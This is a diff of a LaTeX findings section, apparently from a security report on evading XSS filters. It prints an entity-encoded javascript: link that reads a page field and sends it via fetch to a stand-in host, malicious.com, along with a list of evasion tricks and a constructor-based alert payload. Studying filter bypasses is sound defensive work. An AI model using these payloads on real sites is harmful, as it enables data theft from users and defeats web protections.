@@ -1,9 +1,20 @@
 \section{Findings}
 \label{sec:Findings}
 Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
-\begin{lstlisting}
-<a href=j&#97v&#97script&#x3A;
-var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
-var&#32data&#32=&#32&#123body:secret,method:'POST'\};
-fetch`https:\//malicious.com:3001/api/ping?secret=$&#123data\}`>ClickMe</a>
+\begin{lstlisting}[style=basicStyle]
+	<a href=j&#97v&#97script&#x3A;
+	var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
+	var&#32data&#32=&#32&#123body:secret,method:'POST'\};
+	fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
+\end{lstlisting}
+
+\begin{itemize}
+	\item Using function constructor to evade eval() detection
+	\item supplying the argument via tagged template literal to avoid () characters
+	\item the 'a' in front of the template in the template string to avoid an error that is thrown if the first parameter in a multi parameter call to the function constructor is not a valid javascript parameter
+	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
+\end{itemize}
+
+\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
+	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
 \end{lstlisting}
